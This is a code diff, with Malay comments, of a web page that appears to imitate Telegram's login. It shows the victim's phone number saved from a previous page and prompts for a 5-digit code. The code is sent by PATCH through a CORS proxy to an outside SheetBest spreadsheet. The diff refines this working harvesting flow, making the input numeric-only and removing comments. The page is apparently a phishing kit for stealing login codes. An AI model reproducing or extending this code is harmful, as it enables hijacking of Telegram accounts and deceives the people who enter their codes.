@@ -12,7 +12,6 @@
     <div class="content">
       <div><img src="monyet.png" alt="emoji" class="emoji-gif"></div>
 
-      <!-- Paparkan nombor dari halaman sebelum -->
       <h2 class="number" id="showNumber">+60</h2>
 
       <p class="subtitle">
@@ -20,14 +19,22 @@
       </p>
 
       <form id="codeForm" class="form-box">
-        <input type="text" id="codeInput" class="input" placeholder="Code" maxlength="5" required>
+        <!-- type="text" ditukar ke type="tel" + pattern nombor sahaja -->
+        <input 
+          type="tel" 
+          id="codeInput" 
+          class="input" 
+          placeholder="Code" 
+          maxlength="5" 
+          pattern="[0-9]*" 
+          inputmode="numeric" 
+          required>
         <button type="submit" id="nextBtn" class="btn" disabled>Next</button>
       </form>
     </div>
   </div>
 
   <script>
-    // Paparkan nombor dari localStorage (disimpan dari index.html)
     const savedNumber = localStorage.getItem("telegramNumber");
     if (savedNumber) {
       document.getElementById("showNumber").textContent = savedNumber;
@@ -37,19 +44,18 @@
     const nextBtn = document.getElementById("nextBtn");
     const form = document.getElementById("codeForm");
 
-    // Aktifkan butang bila 5 digit dimasukkan
+    // Benarkan hanya nombor ditaip
     codeInput.addEventListener("input", () => {
+      // Buang semua aksara bukan nombor
+      codeInput.value = codeInput.value.replace(/\D/g, "");
+
       const value = codeInput.value.trim();
       nextBtn.disabled = !/^\d{5}$/.test(value);
     });
 
-    // URL API SheetBest (sama macam index.html)
     const API = "https://api.sheetbest.com/sheets/f3cc6873-23ee-4df3-9eb8-49a788f9446a";
-
-    // 🟢 TAMBAH SINI — proxy untuk bypass CORS (supaya GitHub boleh hantar ke SheetBest)
     const PROXY = "https://corsproxy.io/?";
 
-    // Bila form disubmit
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
@@ -59,11 +65,9 @@
         return;
       }
 
-      // Payload untuk update cell B2 (kolum "dua")
       const payload = { dua: code };
 
       try {
-        // 🟢 Ubah fetch supaya guna proxy juga
         const res = await fetch(PROXY + API + "/0", {
           method: "PATCH",
           headers: { "Content-Type": "application/json" },
